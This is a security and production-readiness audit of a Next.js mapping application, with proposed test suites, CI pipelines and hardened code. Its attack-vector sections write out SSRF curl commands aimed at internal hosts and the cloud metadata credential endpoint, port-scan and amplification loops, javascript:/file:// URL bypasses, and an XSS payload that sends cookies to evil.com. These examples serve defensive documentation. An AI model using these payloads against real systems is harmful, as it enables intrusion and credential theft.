# KeyMap Production Readiness Audit
## Comprehensive Technical Analysis - October 28, 2025

---

## EXECUTIVE SUMMARY

This audit reveals **39 critical production-readiness gaps** across security, testing, error handling, performance, and code quality. The application demonstrates solid GIS functionality but **CANNOT be deployed to production** without significant remediation.

### Verdict: **DO NOT DEPLOY**
**Production Readiness Score: 2/10**

### Critical Statistics
- **Zero unit tests**
- **Zero integration tests**
- **Zero E2E tests**
- **Zero CI/CD pipeline**
- **Zero error monitoring**
- **Zero authentication**
- **40+ alert() calls** (user experience blocker)
- **12 console.log statements** exposing internals
- **Open CORS proxy** (SSRF vulnerability)
- **No rate limiting**
- **No performance monitoring**

### Severity Breakdown
- 🔴 **Critical:** 12 issues (Production blockers)
- 🟠 **High:** 15 issues (Must fix before launch)
- 🟡 **Medium:** 8 issues (Should fix soon)
- 🔵 **Low:** 4 issues (Technical debt)

**Estimated Remediation:** 67-85 developer hours (2-3 weeks full-time)

---

## 1. TESTING INFRASTRUCTURE - CRITICAL FAILURE

### Current State: **ZERO TESTS**

```bash
$ find . -name "*.test.*" -o -name "*.spec.*" | grep -v node_modules
# NO RESULTS - Absolutely nothing

$ grep -r "jest\|vitest\|playwright\|cypress" package.json
# NO RESULTS - No test framework installed
```

### Missing Components

#### 1.1 Unit Testing
**Status:** ❌ **COMPLETELY MISSING**

**Missing:**
- No test framework (Jest/Vitest)
- No testing library (@testing-library/react)
- No test configuration files
- No test scripts in package.json
- No coverage reporting
- No watch mode setup

**Required Files:**
```
tests/
├── unit/
│   ├── lib/
│   │   ├── fileImporter.test.ts
│   │   ├── stylingEngine.test.ts
│   │   └── map-sources.test.ts
│   ├── components/
│   │   ├── MapLibreMap.test.tsx
│   │   ├── LayerPanel.test.tsx
│   │   └── BasemapSelector.test.tsx
│   └── services/
│       └── validation.test.ts
├── integration/
│   ├── file-import-flow.test.ts
│   ├── spatial-analysis.test.ts
│   └── project-save-load.test.ts
└── e2e/
    ├── map-interaction.spec.ts
    ├── layer-management.spec.ts
    └── data-upload.spec.ts
```

**Example Test Coverage Needed:**

```typescript
// tests/unit/lib/fileImporter.test.ts
import { FileImporter } from '@/lib/services/fileImporter';

describe('FileImporter', () => {
  describe('GeoJSON Import', () => {
    it('should import valid GeoJSON FeatureCollection', async () => {
      const file = new File([JSON.stringify(validGeoJSON)], 'test.geojson');
      const importer = new FileImporter();
      const result = await importer.importFile(file);

      expect(result.success).toBe(true);
      expect(result.data?.features).toHaveLength(3);
    });

    it('should handle malformed GeoJSON', async () => {
      const file = new File(['invalid json'], 'bad.geojson');
      const importer = new FileImporter();
      const result = await importer.importFile(file);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid JSON');
    });

    it('should validate coordinate ranges', async () => {
      const invalidCoords = {
        type: 'FeatureCollection',
        features: [{
          type: 'Feature',
          geometry: { type: 'Point', coordinates: [200, 100] }, // Invalid!
          properties: {}
        }]
      };
      const file = new File([JSON.stringify(invalidCoords)], 'bad.geojson');
      const result = await importer.importFile(file);

      expect(result.success).toBe(false);
    });
  });

  describe('CSV Import', () => {
    it('should detect lat/lon columns', async () => {
      const csv = 'lat,lng,name\n59.9,10.7,Oslo\n60.0,10.8,Location2';
      const file = new File([csv], 'test.csv');
      const result = await importer.importFile(file);

      expect(result.success).toBe(true);
      expect(result.data?.features).toHaveLength(2);
    });

    it('should handle missing coordinate columns', async () => {
      const csv = 'name,value\nOslo,100';
      const file = new File([csv], 'test.csv');
      const result = await importer.importFile(file);

      expect(result.success).toBe(false);
      expect(result.error).toContain('latitude/longitude');
    });
  });
});

// tests/unit/lib/stylingEngine.test.ts
import { StylingEngine } from '@/lib/services/stylingEngine';

describe('StylingEngine', () => {
  const engine = new StylingEngine();

  describe('Classification Methods', () => {
    it('should calculate Jenks breaks correctly', () => {
      const values = [1, 2, 3, 10, 11, 12, 20, 21, 22];
      const breaks = engine.calculateBreaks(values, 3, 'jenks');

      expect(breaks).toHaveLength(3);
      expect(breaks[0]).toBeCloseTo(3, 0);
      expect(breaks[2]).toBeCloseTo(22, 0);
    });

    it('should handle edge case: single value', () => {
      const values = [5, 5, 5, 5];
      const breaks = engine.calculateBreaks(values, 3, 'jenks');

      expect(breaks).toHaveLength(1);
      expect(breaks[0]).toBe(5);
    });

    it('should reject invalid inputs', () => {
      expect(() => {
        engine.calculateBreaks([], 3, 'jenks');
      }).toThrow('Cannot calculate breaks for empty array');
    });
  });

  describe('Choropleth Styling', () => {
    it('should create valid MapLibre expression', () => {
      const style = {
        property: 'population',
        method: 'jenks',
        classes: 3,
        breaks: [1000, 5000, 10000],
        colors: ['#fee5d9', '#fc9272', '#de2d26'],
        colorRamp: 'reds'
      };

      const expression = engine.choroplethToExpression(style);

      expect(expression[0]).toBe('case');
      expect(expression).toContain('#fee5d9');
      expect(expression[expression.length - 1]).toBe('#cccccc'); // default
    });
  });
});
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 40-50 hours

---

#### 1.2 Integration Testing
**Status:** ❌ **COMPLETELY MISSING**

**Critical User Flows Untested:**
1. File upload → Parse → Validate → Display on map
2. Spatial analysis: Buffer → Intersection → Display results
3. Project save → Export → Import → Restore state
4. Basemap switch → Layer persistence → Style reapplication
5. Search → Geocode → Zoom → Marker placement

**Example Integration Test:**

```typescript
// tests/integration/file-import-flow.test.ts
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Home from '@/app/page';

describe('File Import Flow', () => {
  it('should import shapefile and display on map', async () => {
    const { container } = render(<Home />);

    // Open file upload
    const uploadButton = screen.getByText('Upload Data');
    await userEvent.click(uploadButton);

    // Upload shapefile
    const file = new File([shapefileBuffer], 'test.shp');
    const input = container.querySelector('input[type="file"]');
    await userEvent.upload(input!, file);

    // Wait for processing
    await waitFor(() => {
      expect(screen.getByText(/Successfully loaded/)).toBeInTheDocument();
    }, { timeout: 5000 });

    // Verify layer added
    const layerPanel = screen.getByText('Layers');
    await userEvent.click(layerPanel);
    expect(screen.getByText('test.shp')).toBeInTheDocument();

    // Verify map updated
    const map = container.querySelector('.maplibregl-canvas');
    expect(map).toBeInTheDocument();
  });

  it('should handle import errors gracefully', async () => {
    const { container } = render(<Home />);

    const file = new File(['invalid data'], 'bad.shp');
    const input = container.querySelector('input[type="file"]');
    await userEvent.upload(input!, file);

    await waitFor(() => {
      expect(screen.getByText(/Import Failed/)).toBeInTheDocument();
    });
  });
});
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 30-40 hours

---

#### 1.3 End-to-End Testing
**Status:** ❌ **COMPLETELY MISSING**

**Critical Scenarios Untested:**
1. Complete mapping workflow from scratch
2. Multi-layer interaction and analysis
3. Cross-browser compatibility
4. Mobile responsiveness
5. Offline functionality
6. Error recovery scenarios

**Example E2E Test:**

```typescript
// tests/e2e/complete-workflow.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Complete GIS Workflow', () => {
  test('should complete full analysis workflow', async ({ page }) => {
    await page.goto('http://localhost:3000');

    // 1. Upload data
    await page.click('text=Upload Data');
    await page.setInputFiles('input[type="file"]', 'fixtures/boundaries.geojson');
    await expect(page.locator('text=Successfully loaded')).toBeVisible({ timeout: 10000 });

    // 2. Apply styling
    await page.click('text=Style');
    await page.selectOption('select[name="layer"]', 'boundaries.geojson');
    await page.selectOption('select[name="property"]', 'population');
    await page.click('text=Apply Choropleth');
    await expect(page.locator('text=Style applied')).toBeVisible();

    // 3. Run spatial analysis
    await page.click('text=Analysis');
    await page.click('text=Buffer Analysis');
    await page.fill('input[name="distance"]', '500');
    await page.click('text=Run Buffer');
    await expect(page.locator('text=Buffer analysis complete')).toBeVisible();

    // 4. View results
    await page.click('text=Table');
    const rows = page.locator('table tbody tr');
    await expect(rows).toHaveCount(await rows.count(), { timeout: 5000 });

    // 5. Export results
    await page.click('text=Export Data');
    const downloadPromise = page.waitForEvent('download');
    const download = await downloadPromise;
    expect(download.suggestedFilename()).toMatch(/keymap-export.*\.geojson/);
  });

  test('should handle network failures gracefully', async ({ page, context }) => {
    await context.setOffline(true);
    await page.goto('http://localhost:3000');

    await page.click('text=Upload Data');
    // Should show appropriate error, not crash
    await expect(page.locator('text=Network Error')).toBeVisible({ timeout: 5000 });
  });
});
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 25-30 hours

---

### 1.4 Setup Required

**Configuration Files Needed:**

```javascript
// jest.config.js
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'jsdom',
  setupFilesAfterEnv: ['<rootDir>/jest.setup.js'],
  moduleNameMapper: {
    '^@/(.*)$': '<rootDir>/$1',
    '\\.(css|less|scss|sass)$': 'identity-obj-proxy',
  },
  collectCoverageFrom: [
    'app/**/*.{ts,tsx}',
    'components/**/*.{ts,tsx}',
    'lib/**/*.{ts,tsx}',
    '!**/*.d.ts',
    '!**/node_modules/**',
  ],
  coverageThresholds: {
    global: {
      statements: 80,
      branches: 75,
      functions: 80,
      lines: 80,
    },
  },
};

// playwright.config.ts
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  testDir: './tests/e2e',
  fullyParallel: true,
  forbidOnly: !!process.env.CI,
  retries: process.env.CI ? 2 : 0,
  workers: process.env.CI ? 1 : undefined,
  reporter: 'html',
  use: {
    baseURL: 'http://localhost:3000',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
  },
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'firefox', use: { ...devices['Desktop Firefox'] } },
    { name: 'webkit', use: { ...devices['Desktop Safari'] } },
    { name: 'Mobile Chrome', use: { ...devices['Pixel 5'] } },
    { name: 'Mobile Safari', use: { ...devices['iPhone 12'] } },
  ],
  webServer: {
    command: 'npm run dev',
    url: 'http://localhost:3000',
    reuseExistingServer: !process.env.CI,
  },
});
```

**Package.json Updates:**

```json
{
  "scripts": {
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:e2e": "playwright test",
    "test:e2e:ui": "playwright test --ui",
    "test:integration": "jest --testMatch='**/tests/integration/**/*.test.ts'",
    "test:all": "npm run test && npm run test:e2e"
  },
  "devDependencies": {
    "@playwright/test": "^1.40.0",
    "@testing-library/jest-dom": "^6.1.5",
    "@testing-library/react": "^14.1.2",
    "@testing-library/user-event": "^14.5.1",
    "@types/jest": "^29.5.11",
    "jest": "^29.7.0",
    "jest-environment-jsdom": "^29.7.0",
    "ts-jest": "^29.1.1"
  }
}
```

---

## 2. CI/CD PIPELINE - CRITICAL FAILURE

### Current State: **ZERO AUTOMATION**

```bash
$ ls .github/workflows/
# NO RESULTS - No CI/CD whatsoever
```

### Missing Components

#### 2.1 Continuous Integration
**Status:** ❌ **COMPLETELY MISSING**

**Required Pipeline:**

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run type-check

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run test:coverage
      - uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json

  e2e:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npm run test:e2e
      - uses: actions/upload-artifact@v3
        if: always()
        with:
          name: playwright-report
          path: playwright-report/
          retention-days: 30

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --audit-level=high
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  build:
    runs-on: ubuntu-latest
    needs: [lint, test]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-artifact@v3
        with:
          name: build
          path: .next/
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 8-10 hours

---

#### 2.2 Continuous Deployment
**Status:** ❌ **COMPLETELY MISSING**

**Required for Production:**

```yaml
# .github/workflows/deploy.yml
name: Deploy to Production

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4

      - name: Verify Tests Pass
        run: npm run test:all

      - name: Deploy to Vercel
        uses: amondnet/vercel-action@v25
        with:
          vercel-token: ${{ secrets.VERCEL_TOKEN }}
          vercel-org-id: ${{ secrets.ORG_ID }}
          vercel-project-id: ${{ secrets.PROJECT_ID }}
          vercel-args: '--prod'

      - name: Notify Sentry
        run: |
          curl https://sentry.io/api/hooks/release/built/ \
            -X POST \
            -H 'Content-Type: application/json' \
            -d '{"version": "${{ github.sha }}"}'

      - name: Run Smoke Tests
        run: npm run test:smoke -- --url=${{ steps.deploy.outputs.url }}
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 6-8 hours

---

## 3. ERROR HANDLING - CRITICAL FAILURES

### 3.1 Network Errors - No Retry Logic

**Location:** `/home/veba/work/key-map/lib/map/remote-sources.ts:139-177`

**Current Code:**
```typescript
export async function loadRemoteGeoJSON(config: RemoteSourceConfig): Promise<FeatureCollection> {
  const response = await fetch(config.url);  // ❌ No timeout, no retry

  if (!response.ok) {
    throw new Error(`Failed to fetch GeoJSON: ${response.statusText}`);  // ❌ Generic error
  }

  const data = await response.json();
  return data;
}
```

**Problems:**
1. **No timeout** - Can hang indefinitely
2. **No retry logic** - Single network blip = failure
3. **No exponential backoff**
4. **No circuit breaker** for failing services
5. **Generic error messages** don't help debugging

**Fixed Version:**
```typescript
import pRetry from 'p-retry';

interface FetchOptions {
  timeout?: number;
  retries?: number;
  retryDelay?: number;
}

export async function loadRemoteGeoJSON(
  config: RemoteSourceConfig,
  options: FetchOptions = {}
): Promise<FeatureCollection> {
  const {
    timeout = 30000,
    retries = 3,
    retryDelay = 1000
  } = options;

  const fetchWithTimeout = async () => {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);

    try {
      const response = await fetch(config.url, {
        signal: controller.signal,
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'KeyMap/1.0'
        }
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        const error = new NetworkError(
          `HTTP ${response.status}: ${response.statusText}`,
          {
            status: response.status,
            url: config.url,
            retryable: response.status >= 500
          }
        );

        if (response.status >= 500) {
          throw error; // Retry on 5xx
        }
        throw new pRetry.AbortError(error); // Don't retry 4xx
      }

      const data = await response.json();

      // Validate GeoJSON schema
      if (!isValidGeoJSON(data)) {
        throw new pRetry.AbortError(
          new ValidationError('Invalid GeoJSON format', { url: config.url })
        );
      }

      return data;
    } catch (error) {
      clearTimeout(timeoutId);

      if (error.name === 'AbortError') {
        throw new NetworkError('Request timeout', {
          url: config.url,
          timeout,
          retryable: true
        });
      }
      throw error;
    }
  };

  return pRetry(fetchWithTimeout, {
    retries,
    minTimeout: retryDelay,
    onFailedAttempt: (error) => {
      logger.warn(`Fetch attempt ${error.attemptNumber} failed`, {
        url: config.url,
        retriesLeft: error.retriesLeft,
        error: error.message
      });
    }
  });
}

class NetworkError extends Error {
  constructor(message: string, public meta: Record<string, any>) {
    super(message);
    this.name = 'NetworkError';
  }
}
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 4-6 hours

---

### 3.2 Input Validation - Security Vulnerability

**Location:** `/home/veba/work/key-map/components/map/AddLayerDialog.tsx:112-115`

**Current Code:**
```typescript
if (!remoteUrl.includes('{z}') || !remoteUrl.includes('{x}') || !remoteUrl.includes('{y}')) {
  setError('XYZ URL must contain {z}, {x}, and {y} placeholders');
  return;
}
```

**Attack Vectors:**
```javascript
// Can bypass validation
"javascript:alert(1)//{z}/{x}/{y}"  // XSS
"data:text/html,<script>...</script>//{z}/{x}/{y}"  // XSS
"file:///etc/passwd/{z}/{x}/{y}"  // File system access
```

**Fixed Version:**
```typescript
import { z } from 'zod';

const XYZUrlSchema = z.string()
  .url('Must be a valid URL')
  .refine(url => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  }, 'Only HTTP/HTTPS protocols allowed')
  .refine(
    url => url.includes('{z}') && url.includes('{x}') && url.includes('{y}'),
    'Must contain {z}, {x}, and {y} placeholders'
  )
  .refine(
    url => !url.match(/^https?:\/\/(localhost|127\.0\.0\.1|0\.0\.0\.0)/),
    'Cannot proxy localhost URLs'
  );

// Usage
try {
  const validatedUrl = XYZUrlSchema.parse(remoteUrl);
  // Proceed with validated URL
} catch (error) {
  if (error instanceof z.ZodError) {
    setError(error.errors[0].message);
  }
}
```

**Severity:** 🔴 **CRITICAL** (Security)

**Estimated Effort:** 6-8 hours (across all inputs)

---

### 3.3 Error Boundaries - Missing

**Current State:** **ZERO** error boundaries in the entire application.

**Impact:** A single unhandled exception anywhere will crash the entire UI.

**Required Implementation:**

```typescript
// components/ErrorBoundary.tsx
'use client';

import React, { Component, ErrorInfo, ReactNode } from 'react';
import * as Sentry from '@sentry/nextjs';

interface Props {
  children: ReactNode;
  fallback?: ReactNode;
  onError?: (error: Error, errorInfo: ErrorInfo) => void;
}

interface State {
  hasError: boolean;
  error: Error | null;
  errorInfo: ErrorInfo | null;
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props);
    this.state = {
      hasError: false,
      error: null,
      errorInfo: null
    };
  }

  static getDerivedStateFromError(error: Error): Partial<State> {
    return { hasError: true, error };
  }

  componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error('ErrorBoundary caught:', error, errorInfo);

    // Report to error monitoring
    Sentry.captureException(error, {
      contexts: { react: { componentStack: errorInfo.componentStack } }
    });

    // Custom callback
    this.props.onError?.(error, errorInfo);

    this.setState({ error, errorInfo });
  }

  handleReset = () => {
    this.setState({ hasError: false, error: null, errorInfo: null });
  };

  render() {
    if (this.state.hasError) {
      if (this.props.fallback) {
        return this.props.fallback;
      }

      return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
          <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
            <div className="flex items-center gap-3 mb-4">
              <svg className="w-8 h-8 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                />
              </svg>
              <h2 className="text-xl font-semibold text-gray-900">Something went wrong</h2>
            </div>

            <p className="text-gray-600 mb-4">
              An unexpected error occurred. The error has been reported and we'll look into it.
            </p>

            {process.env.NODE_ENV === 'development' && this.state.error && (
              <details className="mb-4">
                <summary className="cursor-pointer text-sm font-medium text-gray-700 mb-2">
                  Error Details (dev only)
                </summary>
                <pre className="bg-gray-100 p-3 rounded text-xs overflow-auto max-h-48">
                  {this.state.error.toString()}
                  {this.state.errorInfo?.componentStack}
                </pre>
              </details>
            )}

            <div className="flex gap-2">
              <button
                onClick={this.handleReset}
                className="flex-1 px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
              >
                Try Again
              </button>
              <button
                onClick={() => window.location.reload()}
                className="flex-1 px-4 py-2 bg-gray-200 text-gray-900 rounded hover:bg-gray-300"
              >
                Reload Page
              </button>
            </div>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

// Usage in app/layout.tsx
export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <body>
        <ErrorBoundary>
          {children}
        </ErrorBoundary>
      </body>
    </html>
  );
}

// Usage for specific components
export default function MapPage() {
  return (
    <ErrorBoundary
      fallback={
        <div className="p-8 text-center">
          <p>Map failed to load. Please refresh the page.</p>
        </div>
      }
    >
      <MapLibreMap />
    </ErrorBoundary>
  );
}
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 3-4 hours

---

## 4. SECURITY VULNERABILITIES

### 4.1 CRITICAL: Open CORS Proxy (SSRF)

**Location:** `/home/veba/work/key-map/app/api/proxy/route.ts`

**Current Code:**
```typescript
// route.ts:41-53
// Optional: Whitelist domains (uncomment and configure as needed)
// const allowedDomains = [...]  // ❌ COMMENTED OUT!

// route.ts:79
headers: {
  'Access-Control-Allow-Origin': '*',  // ❌ DANGEROUS!
}
```

**Attack Vectors:**

1. **SSRF (Server-Side Request Forgery):**
```bash
# Scan internal network
curl https://keymap.com/api/proxy?url=http://localhost:8080/admin
curl https://keymap.com/api/proxy?url=http://192.168.1.1/router-config

# Access cloud metadata
curl https://keymap.com/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

2. **Free Proxy Abuse:**
```bash
# Use as free CDN
curl https://keymap.com/api/proxy?url=http://my-malware.com/virus.exe

# DDoS amplification
for i in {1..1000}; do
  curl https://keymap.com/api/proxy?url=http://victim.com/heavy-endpoint &
done
```

3. **Port Scanning:**
```bash
# Scan internal services
for port in {1..65535}; do
  curl -s https://keymap.com/api/proxy?url=http://internal-host:$port
done
```

**Fixed Version:**

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';
import dns from 'dns/promises';

const ALLOWED_DOMAINS = [
  'basemaps.cartocdn.com',
  'tile.openstreetmap.org',
  'server.arcgisonline.com',
  'api.maptiler.com',
  'tiles.stadiamaps.com'
];

const BLOCKED_IP_RANGES = [
  /^10\./,                          // Private: 10.0.0.0/8
  /^127\./,                         // Loopback: 127.0.0.0/8
  /^172\.(1[6-9]|2\d|3[01])\./,    // Private: 172.16.0.0/12
  /^192\.168\./,                    // Private: 192.168.0.0/16
  /^169\.254\./,                    // Link-local: 169.254.0.0/16
  /^224\./,                         // Multicast: 224.0.0.0/4
  /^0\./,                           // Invalid
  /^255\./,                         // Broadcast
];

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 h'),
  analytics: true,
});

export async function GET(request: NextRequest) {
  try {
    // 1. Rate limiting
    const ip = request.headers.get('x-forwarded-for') ||
               request.headers.get('x-real-ip') ||
               'unknown';
    const { success, limit, remaining } = await ratelimit.limit(ip);

    if (!success) {
      return NextResponse.json(
        { error: 'Rate limit exceeded. Try again later.' },
        {
          status: 429,
          headers: {
            'X-RateLimit-Limit': limit.toString(),
            'X-RateLimit-Remaining': remaining.toString(),
          }
        }
      );
    }

    // 2. Get and validate URL parameter
    const { searchParams } = new URL(request.url);
    const targetUrl = searchParams.get('url');

    if (!targetUrl) {
      return NextResponse.json(
        { error: 'Missing url parameter' },
        { status: 400 }
      );
    }

    // 3. Parse URL
    let url: URL;
    try {
      url = new URL(targetUrl);
    } catch (e) {
      return NextResponse.json(
        { error: 'Invalid URL format' },
        { status: 400 }
      );
    }

    // 4. Protocol validation
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      return NextResponse.json(
        { error: 'Only HTTP and HTTPS protocols are allowed' },
        { status: 400 }
      );
    }

    // 5. Domain whitelist check
    const isAllowed = ALLOWED_DOMAINS.some(domain =>
      url.hostname === domain || url.hostname.endsWith(`.${domain}`)
    );

    if (!isAllowed) {
      logger.warn('Blocked proxy request to non-whitelisted domain', {
        ip,
        requestedDomain: url.hostname,
        url: targetUrl
      });

      return NextResponse.json(
        { error: 'Domain not whitelisted' },
        { status: 403 }
      );
    }

    // 6. DNS resolution and SSRF protection
    try {
      const addresses = await dns.resolve4(url.hostname);

      for (const address of addresses) {
        if (BLOCKED_IP_RANGES.some(range => range.test(address))) {
          logger.security('SSRF attempt blocked', {
            ip,
            hostname: url.hostname,
            resolvedIp: address,
            url: targetUrl
          });

          return NextResponse.json(
            { error: 'Access to internal resources is forbidden' },
            { status: 403 }
          );
        }
      }
    } catch (dnsError) {
      return NextResponse.json(
        { error: 'Unable to resolve domain' },
        { status: 400 }
      );
    }

    // 7. Size limit check (prevent large downloads)
    const MAX_SIZE = 10 * 1024 * 1024; // 10MB

    // 8. Fetch with timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);

    try {
      const response = await fetch(targetUrl, {
        signal: controller.signal,
        headers: {
          'User-Agent': 'KeyMap/1.0',
          'Accept': 'image/*,application/json,application/x-protobuf',
        },
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        return NextResponse.json(
          { error: `Upstream error: ${response.status}` },
          { status: response.status }
        );
      }

      // Check content length
      const contentLength = response.headers.get('content-length');
      if (contentLength && parseInt(contentLength) > MAX_SIZE) {
        return NextResponse.json(
          { error: 'Response too large' },
          { status: 413 }
        );
      }

      // Stream with size limit
      const data = await response.arrayBuffer();
      if (data.byteLength > MAX_SIZE) {
        return NextResponse.json(
          { error: 'Response too large' },
          { status: 413 }
        );
      }

      const contentType = response.headers.get('content-type') || 'application/octet-stream';

      return new NextResponse(data, {
        status: 200,
        headers: {
          'Content-Type': contentType,
          'Cache-Control': 'public, max-age=86400, stale-while-revalidate=604800',
          'X-RateLimit-Remaining': remaining.toString(),
          'Access-Control-Allow-Origin': process.env.ALLOWED_ORIGIN || 'https://keymap.com',
          'X-Content-Type-Options': 'nosniff',
          'X-Frame-Options': 'DENY',
        },
      });
    } catch (fetchError) {
      clearTimeout(timeoutId);

      if (fetchError.name === 'AbortError') {
        return NextResponse.json(
          { error: 'Request timeout' },
          { status: 504 }
        );
      }

      throw fetchError;
    }
  } catch (error) {
    logger.error('Proxy error', { error });

    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
```

**Severity:** 🔴 **CRITICAL** (Security + Abuse)

**Estimated Effort:** 6-8 hours

---

### 4.2 CRITICAL: Environment Variable Mishandling

**Location:** `/home/veba/work/key-map/lib/supabase/client.ts:9-10`

**Current Code:**
```typescript
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';

if (!supabaseUrl || !supabaseAnonKey) {
  console.warn(  // ❌ Exposed to client!
    'Supabase credentials not found. Please set...'
  );
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);  // ❌ Invalid client
```

**Problems:**
1. Silent failure with empty strings
2. Warning exposed in production
3. No runtime validation
4. Creates broken client instance

**Fixed Version:**

```typescript
// lib/config/env.ts
import { z } from 'zod';

const clientEnvSchema = z.object({
  NEXT_PUBLIC_SUPABASE_URL: z.string().url('Invalid Supabase URL'),
  NEXT_PUBLIC_SUPABASE_ANON_KEY: z.string().min(20, 'Invalid Supabase anon key'),
  NEXT_PUBLIC_MAPTILER_KEY: z.string().optional(),
});

const serverEnvSchema = z.object({
  SUPABASE_SERVICE_ROLE_KEY: z.string().min(20),
  SENTRY_DSN: z.string().url().optional(),
  UPSTASH_REDIS_REST_URL: z.string().url().optional(),
  UPSTASH_REDIS_REST_TOKEN: z.string().optional(),
});

function validateEnv() {
  try {
    const client = clientEnvSchema.parse({
      NEXT_PUBLIC_SUPABASE_URL: process.env.NEXT_PUBLIC_SUPABASE_URL,
      NEXT_PUBLIC_SUPABASE_ANON_KEY: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
      NEXT_PUBLIC_MAPTILER_KEY: process.env.NEXT_PUBLIC_MAPTILER_KEY,
    });

    let server = {};
    if (typeof window === 'undefined') {
      server = serverEnvSchema.parse({
        SUPABASE_SERVICE_ROLE_KEY: process.env.SUPABASE_SERVICE_ROLE_KEY,
        SENTRY_DSN: process.env.SENTRY_DSN,
        UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL,
        UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
    }

    return { ...client, ...server };
  } catch (error) {
    if (error instanceof z.ZodError) {
      const missing = error.errors.map(e => e.path.join('.')).join(', ');
      throw new Error(
        `Missing or invalid environment variables: ${missing}\n` +
        `Please check your .env.local file.`
      );
    }
    throw error;
  }
}

export const env = validateEnv();

// lib/supabase/client.ts
import { createClient } from '@supabase/supabase-js';
import { env } from '@/lib/config/env';

export const supabase = createClient(
  env.NEXT_PUBLIC_SUPABASE_URL,
  env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
  {
    auth: {
      persistSession: true,
      autoRefreshToken: true,
    },
  }
);
```

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 3-4 hours

---

### 4.3 HIGH: XSS Vulnerability in User Inputs

**Location:** `/home/veba/work/key-map/components/map/AttributeTable.tsx:244`

**Current Code:**
```typescript
<td key={col} className="px-3 py-2 whitespace-nowrap">
  {value !== null && value !== undefined ? String(value) : '-'}
  {/* ❌ No sanitization! */}
</td>
```

**Attack Vector:**
```json
{
  "type": "FeatureCollection",
  "features": [{
    "type": "Feature",
    "properties": {
      "name": "<img src=x onerror=alert(document.cookie)>",
      "description": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    },
    "geometry": {"type": "Point", "coordinates": [0, 0]}
  }]
}
```

**Fixed Version:**

```typescript
import DOMPurify from 'isomorphic-dompurify';

// Configure DOMPurify
const sanitize = (value: unknown): string => {
  if (value === null || value === undefined) return '-';

  const stringValue = String(value);

  // Remove all HTML tags for table cells
  return DOMPurify.sanitize(stringValue, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
};

// Usage
